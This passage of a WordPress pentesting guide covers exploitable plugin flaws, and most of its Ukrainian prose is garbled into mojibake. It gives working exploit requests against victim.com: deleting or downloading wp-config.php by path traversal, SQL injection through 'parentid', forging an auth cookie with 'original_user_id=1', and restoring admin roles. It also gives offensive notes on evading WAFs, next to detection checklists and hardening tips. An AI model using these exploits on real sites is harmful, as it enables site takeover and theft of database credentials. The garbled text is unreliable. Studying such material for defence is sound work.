–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–∏–¥–∞–ª–∏—Ç–∏ –±—É–¥—å-—è–∫–∏–π —Ñ–∞–π–ª –∞–±–æ –∫–∞—Ç–∞–ª–æ–≥ **–Ω–∏–∂—á–µ –±–∞–∑–æ–≤–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É uploads** (–∑–∞–∑–≤–∏—á–∞–π `<wp-root>/wp-content/uploads/`) —à–ª—è—Ö–æ–º –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –æ–¥–Ω–æ–≥–æ HTTP POST request:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
–û—Å–∫—ñ–ª—å–∫–∏ `wp-config.php` –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –ø–æ–∑–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—î—é *uploads*, —á–æ—Ç–∏—Ä—å–æ—Ö –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç–µ–π `../` –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –¥–ª—è —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ—ó —ñ–Ω—Å—Ç–∞–ª—è—Ü—ñ—ó. –í–∏–¥–∞–ª–µ–Ω–Ω—è `wp-config.php` –∑–º—É—à—É—î WordPress –ø—Ä–∏ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É –≤—ñ–¥–≤—ñ–¥—É–≤–∞–Ω–Ω—ñ —É–≤—ñ–π—Ç–∏ –≤ –º–∞–π—Å—Ç–µ—Ä –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è, —â–æ –¥–æ–∑–≤–æ–ª—è—î –ø–æ–≤–Ω–µ –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Å–∞–π—Ç—É (–∞—Ç–∞–∫—É—é—á–∏–π –ø—Ä–æ—Å—Ç–æ –Ω–∞–¥–∞—î –Ω–æ–≤—É DB –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —ñ —Å—Ç–≤–æ—Ä—é—î –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞).

–Ü–Ω—à—ñ –≤–∞–∂–ª–∏–≤—ñ —Ü—ñ–ª—ñ –≤–∫–ª—é—á–∞—é—Ç—å `.php` —Ñ–∞–π–ª–∏ –ø–ª–∞–≥—ñ–Ω—ñ–≤/—Ç–µ–º (—â–æ–± –∑–ª–∞–º–∞—Ç–∏ –ø–ª–∞–≥—ñ–Ω–∏ –±–µ–∑–ø–µ–∫–∏) –∞–±–æ –ø—Ä–∞–≤–∏–ª–∞ `.htaccess`.

#### Detection checklist

* –ë—É–¥—å-—è–∫–∏–π callback `add_action( 'wp_ajax_nopriv_...')`, —è–∫–∏–π –≤–∏–∫–ª–∏–∫–∞—î —Ñ–∞–π–ª–æ–≤—ñ —Ö–µ–ª–ø–µ—Ä–∏ (`copy()`, `unlink()`, `$wp_filesystem->delete()`, —Ç–æ—â–æ).
* –ö–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü—ñ—è –Ω–µ—Å—Ñ—ñ–ª—å—Ç—Ä–æ–≤–∞–Ω–æ–≥–æ –≤–≤–µ–¥–µ–Ω–Ω—è –≤—ñ–¥ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤ —à–ª—è—Ö–∏ (—à—É–∫–∞–π—Ç–µ `$_POST`, `$_GET`, `$_REQUEST`).
* –í—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å `check_ajax_referer()` —Ç–∞ `current_user_can()`/`is_user_logged_in()`.

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

–ë–∞–≥–∞—Ç–æ –ø–ª–∞–≥—ñ–Ω—ñ–≤ —Ä–µ–∞–ª—ñ–∑—É—é—Ç—å —Ñ—É–Ω–∫—Ü—ñ—é "view as role" –∞–±–æ —Ç–∏–º—á–∞—Å–æ–≤–æ—ó –∑–º—ñ–Ω–∏ —Ä–æ–ª—ñ, –∑–±–µ—Ä—ñ–≥–∞—é—á–∏ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ —Ä–æ–ª—å(—ñ) –≤ user meta, —â–æ–± –ø–æ—Ç—ñ–º —ó—Ö –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏. –Ø–∫—â–æ —à–ª—è—Ö –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–æ–∫–ª–∞–¥–∞—î—Ç—å—Å—è –ª–∏—à–µ –Ω–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ –∑–∞–ø–∏—Ç—É (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `$_REQUEST['reset-for']`) —ñ —Å–ø–∏—Å–æ–∫, —è–∫–∏–º –∫–µ—Ä—É—î –ø–ª–∞–≥—ñ–Ω, –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ capabilities —Ç–∞ –≤–∞–ª—ñ–¥–Ω–æ–≥–æ nonce, —Ü–µ –ø–µ—Ä–µ—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –Ω–∞ –≤–µ—Ä—Ç–∏–∫–∞–ª—å–Ω–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.

–†–µ–∞–ª—å–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥ –±—É–ª–æ –∑–Ω–∞–π–¥–µ–Ω–æ –≤ –ø–ª–∞–≥—ñ–Ω—ñ Admin and Site Enhancements (ASE) (‚â§ 7.6.2.1). –ì—ñ–ª–∫–∞ reset –≤—ñ–¥–Ω–æ–≤–ª—é–≤–∞–ª–∞ —Ä–æ–ª—ñ –Ω–∞ –æ—Å–Ω–æ–≤—ñ `reset-for=<username>`, —è–∫—â–æ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑'—è–≤–ª—è–ª–æ—Å—è —É –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ–º—É –º–∞—Å–∏–≤—ñ `$options['viewing_admin_as_role_are']`, –∞–ª–µ –Ω–µ –≤–∏–∫–æ–Ω—É–≤–∞–ª–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫—É `current_user_can()` —ñ –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è–ª–∞ nonce –ø–µ—Ä–µ–¥ –≤–∏–¥–∞–ª–µ–Ω–Ω—è–º –ø–æ—Ç–æ—á–Ω–∏—Ö —Ä–æ–ª–µ–π —Ç–∞ –ø–æ–≤—Ç–æ—Ä–Ω–∏–º –¥–æ–¥–∞–≤–∞–Ω–Ω—è–º –∑–±–µ—Ä–µ–∂–µ–Ω–∏—Ö —Ä–æ–ª–µ–π –∑ user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
–ß–æ–º—É —Ü–µ –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏

- –î–æ–≤—ñ—Ä—è—î `$_REQUEST['reset-for']` —Ç–∞ –æ–ø—Ü—ñ—ó –ø–ª–∞–≥—ñ–Ω–∞ –±–µ–∑ —Å–µ—Ä–≤–µ—Ä–Ω–æ—ó –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó.
- –Ø–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á —Ä–∞–Ω—ñ—à–µ –º–∞–≤ –≤–∏—â—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó, –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –≤ `_asenha_view_admin_as_original_roles`, —ñ –±—É–≤ –ø–æ–Ω–∏–∂–µ–Ω–∏–π, –≤—ñ–Ω –º–æ–∂–µ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ —ó—Ö, –∑–≤–µ—Ä–Ω—É–≤—à–∏—Å—å –¥–æ —à–ª—è—Ö—É —Å–∫–∏–¥–∞–Ω–Ω—è.
- –£ –¥–µ—è–∫–∏—Ö —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è—Ö –±—É–¥—å-—è–∫–∏–π –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ —ñ–Ω—ñ—Ü—ñ—é–≤–∞—Ç–∏ —Å–∫–∏–¥–∞–Ω–Ω—è –¥–ª—è —ñ–Ω—à–æ–≥–æ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–µ –≤—Å–µ —â–µ –ø—Ä–∏—Å—É—Ç–Ω—î –≤ `viewing_admin_as_role_are` (–ø–æ—Ä—É—à–µ–Ω–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—è).

–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è (–ø—Ä–∏–∫–ª–∞–¥)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
–ù–∞ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –∑–±—ñ—Ä–∫–∞—Ö —Ü–µ –≤–∏–¥–∞–ª—è—î –ø–æ—Ç–æ—á–Ω—ñ —Ä–æ–ª—ñ —Ç–∞ –ø–æ–≤—Ç–æ—Ä–Ω–æ –¥–æ–¥–∞—î –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ —Ä–æ–ª—ñ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `administrator`), —Ñ–∞–∫—Ç–∏—á–Ω–æ –ø—ñ–¥–≤–∏—â—É—é—á–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó.

Detection checklist

- –®—É–∫–∞–π—Ç–µ —Ñ—É–Ω–∫—Ü—ñ—ó –ø–µ—Ä–µ–º–∏–∫–∞–Ω–Ω—è —Ä–æ–ª–µ–π, —è–∫—ñ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å ‚Äú–æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ —Ä–æ–ª—ñ‚Äù –≤ user meta (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `_asenha_view_admin_as_original_roles`).
- –í–∏–∑–Ω–∞—á—Ç–µ —à–ª—è—Ö–∏ —Å–∫–∏–¥–∞–Ω–Ω—è/–≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è, —è–∫—ñ:
- –ß–∏—Ç–∞—Ç–∏ —ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ `$_REQUEST` / `$_GET` / `$_POST`.
- –ú–æ–¥–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ —Ä–æ–ª—ñ —á–µ—Ä–µ–∑ `add_role()` / `remove_role()` –±–µ–∑ `current_user_can()` —Ç–∞ `wp_verify_nonce()` / `check_admin_referer()`.
- –ê–≤—Ç–æ—Ä–∏–∑–æ–≤—É–≤–∞—Ç–∏ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –º–∞—Å–∏–≤—É –æ–ø—Ü—ñ–π –ø–ª–∞–≥—ñ–Ω–∞ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `viewing_admin_as_role_are`) –∑–∞–º—ñ—Å—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –º–æ–∂–ª–∏–≤–æ—Å—Ç–µ–π –∞–∫—Ç–æ—Ä–∞.

---

### Unauthenticated privilege escalation via cookie‚Äëtrusted user switching on public `init` (Service Finder ‚Äúsf-booking‚Äù)

–î–µ—è–∫—ñ –ø–ª–∞–≥—ñ–Ω–∏ –ø—ñ–¥–∫–ª—é—á–∞—é—Ç—å —Ö–µ–ª–ø–µ—Ä–∏ –ø–µ—Ä–µ–º–∏–∫–∞–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–æ –ø—É–±–ª—ñ—á–Ω–æ–≥–æ —Ö—É–∫–∞ `init` —ñ –≤–∏–∑–Ω–∞—á–∞—é—Ç—å —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å –∑ cookie, —è–∫–∏–º –∫–µ—Ä—É—î –∫–ª—ñ—î–Ω—Ç. –Ø–∫—â–æ –∫–æ–¥ –≤–∏–∫–ª–∏–∫–∞—î `wp_set_auth_cookie()` –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, –º–æ–∂–ª–∏–≤–æ—Å—Ç–µ–π —Ç–∞ –¥—ñ–π—Å–Ω–æ–≥–æ nonce, –±—É–¥—å‚Äë—è–∫–∏–π –Ω–µ–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á –º–æ–∂–µ –ø—Ä–∏–º—É—Å–æ–≤–æ –∑–∞–ª–æ–≥—ñ–Ω–∏—Ç–∏—Å—å —è–∫ –¥–æ–≤—ñ–ª—å–Ω–∏–π user ID.

Typical vulnerable pattern (simplified from Service Finder Bookings ‚â§ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // üî• sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
–ß–æ–º—É —Ü–µ –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏

- –ü—É–±–ª—ñ—á–Ω–∏–π `init` hook —Ä–æ–±–∏—Ç—å –æ–±—Ä–æ–±–Ω–∏–∫ –¥–æ—Å—Ç—É–ø–Ω–∏–º –¥–ª—è –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ (–≤—ñ–¥—Å—É—Ç–Ω—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ `is_user_logged_in()`).
- –Ü–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å –≤–∏–∑–Ω–∞—á–∞—î—Ç—å—Å—è cookie, —è–∫—É –º–æ–∂–µ –∑–º—ñ–Ω–∏—Ç–∏ –∫–ª—ñ—î–Ω—Ç (`original_user_id`).
- –ü—Ä—è–º–∏–π –≤–∏–∫–ª–∏–∫ `wp_set_auth_cookie($uid)` –∞–≤—Ç–æ—Ä–∏–∑—É—î –∑–∞–ø–∏—Ç—É–≤–∞—á–∞ —è–∫ —Ü—å–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ capability/nonce.

–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Generic edge/server WAFs are tuned for broad patterns (SQLi, XSS, LFI). Many high‚Äëimpact WordPress/plugin flaws are application-specific logic/auth bugs that look like benign traffic unless the engine understands WordPress routes and plugin semantics.

–û—Ñ–µ–Ω—Å–∏–≤–Ω—ñ –Ω–æ—Ç–∞—Ç–∫–∏

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

–ó–∞—Ö–∏—Å–Ω—ñ –Ω–æ—Ç–∞—Ç–∫–∏

- Don‚Äôt rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

## –ó–∞—Ö–∏—Å—Ç WordPress

### –†–µ–≥—É–ª—è—Ä–Ω—ñ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è

–ü–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ WordPress, plugins, and themes are up to date. –¢–∞–∫–æ–∂ –ø—ñ–¥—Ç–≤–µ—Ä–¥—ñ—Ç—å, —â–æ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —É–≤—ñ–º–∫–Ω–µ–Ω–æ –≤ wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
–¢–∞–∫–æ–∂, **–≤—Å—Ç–∞–Ω–æ–≤–ª—é–π—Ç–µ –ª–∏—à–µ –Ω–∞–¥—ñ–π–Ω—ñ WordPress –ø–ª–∞–≥—ñ–Ω–∏ —Ç–∞ —Ç–µ–º–∏**.

### –ü–ª–∞–≥—ñ–Ω–∏ –±–µ–∑–ø–µ–∫–∏

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **–Ü–Ω—à—ñ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ—ó**

- –í–∏–¥–∞–ª—ñ—Ç—å —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ **admin**
- –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ **–Ω–∞–¥—ñ–π–Ω—ñ –ø–∞—Ä–æ–ª—ñ** —ñ **2FA**
- –ü–µ—Ä—ñ–æ–¥–∏—á–Ω–æ –ø–µ—Ä–µ–≥–ª—è–¥–∞–π—Ç–µ **–¥–æ–∑–≤–æ–ª–∏** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤
- –û–±–º–µ–∂—Ç–µ –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Å–ø—Ä–æ–± –≤—Ö–æ–¥—É, —â–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ Brute Force –∞—Ç–∞–∫–∞–º
- –ü–µ—Ä–µ–π–º–µ–Ω—É–π—Ç–µ —Ñ–∞–π–ª **`wp-admin.php`** —Ç–∞ –¥–æ–∑–≤–æ–ª—è–π—Ç–µ –¥–æ—Å—Ç—É–ø –ª–∏—à–µ –∑ –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ—ó –º–µ—Ä–µ–∂—ñ –∞–±–æ –∑ –ø–µ–≤–Ω–∏—Ö IP-–∞–¥—Ä–µ—Å.


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

–ü–ª–∞–≥—ñ–Ω WP Job Portal –¥–ª—è —Ä–µ–∫—Ä—É—Ç–∏–Ω–≥—É –≤—ñ–¥–∫—Ä–∏–≤–∞–≤ –∑–∞–¥–∞—á—É **savecategory**, —è–∫–∞ –∑—Ä–µ—à—Ç–æ—é –≤–∏–∫–æ–Ω—É—î –Ω–∞—Å—Ç—É–ø–Ω–∏–π –≤—Ä–∞–∑–ª–∏–≤–∏–π –∫–æ–¥ —É `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
–ü—Ä–æ–±–ª–µ–º–∏, –≤–Ω–µ—Å–µ–Ω—ñ —Ü–∏–º —Ñ—Ä–∞–≥–º–µ–Ω—Ç–æ–º:

1. **–ù–µ–Ω–∞–ª–µ–∂–Ω–æ –æ—á–∏—â–µ–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏–π –≤–≤—ñ–¥** ‚Äì `parentid` –Ω–∞–¥—Ö–æ–¥–∏—Ç—å –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –∑ HTTP-–∑–∞–ø–∏—Ç—É.
2. **–ö–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü—ñ—è —Ä—è–¥–∫—ñ–≤ —É WHERE-–∫–ª–∞—É–∑—ñ** ‚Äì –≤—ñ–¥—Å—É—Ç–Ω—ñ `is_numeric()` / `esc_sql()` / prepared statement.
3. **–î–æ—Å—Ç—É–ø –±–µ–∑ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó** ‚Äì —Ö–æ—á–∞ –¥—ñ—è –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —á–µ—Ä–µ–∑ `admin-post.php`, —î–¥–∏–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ ‚Äî **CSRF nonce** (`wp_verify_nonce()`), —è–∫—É –±—É–¥—å-—è–∫–∏–π –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∑—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏, —â–æ –º—ñ—Å—Ç–∏—Ç—å —à–æ—Ä—Ç–∫–æ–¥ `[wpjobportal_my_resumes]`.

#### –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

1. –û—Ç—Ä–∏–º–∞–π—Ç–µ —Å–≤—ñ–∂–∏–π nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. –Ü–Ω–∂–µ–∫—Ç—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π SQL, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
–í—ñ–¥–ø–æ–≤—ñ–¥—å —Ä–æ–∑–∫—Ä–∏–≤–∞—î —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É –∞–±–æ –∑–º—ñ–Ω—é—î –±–∞–∑—É –¥–∞–Ω–∏—Ö, —â–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—î SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

–©–µ –æ–¥–Ω–µ –∑–∞–≤–¥–∞–Ω–Ω—è, **downloadcustomfile**, –¥–æ–∑–≤–æ–ª—è–ª–æ –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á–∞–º –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ **–±—É–¥—å-—è–∫–∏–π —Ñ–∞–π–ª –Ω–∞ –¥–∏—Å–∫—É** —á–µ—Ä–µ–∑ path traversal. –í—Ä–∞–∑–ª–∏–≤–∏–π sink –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` —î attacker-controlled —ñ –∫–æ–Ω–∫–∞—Ç–µ–Ω—É—î—Ç—å—Å—è **–±–µ–∑ —Å–∞–Ω—ñ—Ç–∏–∑–∞—Ü—ñ—ó**. –ó–Ω–æ–≤—É, —î–¥–∏–Ω–∏–º –±–∞—Ä'—î—Ä–æ–º —î **CSRF nonce**, —è–∫–∏–π –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∑—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ —Ä–µ–∑—é–º–µ.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
–°–µ—Ä–≤–µ—Ä –ø–æ–≤–µ—Ä—Ç–∞—î –≤–º—ñ—Å—Ç `wp-config.php`, leaking DB credentials and auth keys.

## Unauthenticated account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

–ë–∞–≥–∞—Ç–æ —Ç–µ–º/–ø–ª–∞–≥—ñ–Ω—ñ–≤ –ø–æ—Å—Ç–∞—á–∞—é—Ç—å "social login" –¥–æ–ø–æ–º—ñ–∂–Ω—ñ —Å–∫—Ä–∏–ø—Ç–∏, –¥–æ—Å—Ç—É–ø–Ω—ñ —á–µ—Ä–µ–∑ admin-ajax.php. –Ø–∫—â–æ –Ω–µ–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∞ AJAX-–¥—ñ—è (wp_ajax_nopriv_...) –¥–æ–≤—ñ—Ä—è—î —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∞–º, –Ω–∞–¥–∞–Ω–∏–º –∫–ª—ñ—î–Ω—Ç–æ–º, –∫–æ–ª–∏ –¥–∞–Ω—ñ –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞ –≤—ñ–¥—Å—É—Ç–Ω—ñ, —ñ –ø–æ—Ç—ñ–º –≤–∏–∫–ª–∏–∫–∞—î wp_set_auth_cookie(), —Ü–µ –ø–µ—Ä–µ—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –Ω–∞ –ø–æ–≤–Ω–∏–π –æ–±—Ö—ñ–¥ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó.

–¢–∏–ø–æ–≤–∏–π –≤—Ä–∞–∑–ª–∏–≤–∏–π —à–∞–±–ª–æ–Ω (—Å–ø—Ä–æ—â–µ–Ω–æ)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider ‚Äì execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // üî• logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
–ß–æ–º—É —Ü–µ –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏

- –î–æ—Å—Ç—É–ø –±–µ–∑ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ admin-ajax.php (–¥—ñ—è wp_ajax_nopriv_‚Ä¶).
- –í—ñ–¥—Å—É—Ç–Ω—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ nonce/capability –ø–µ—Ä–µ–¥ –∑–º—ñ–Ω–æ—é —Å—Ç–∞–Ω—É.
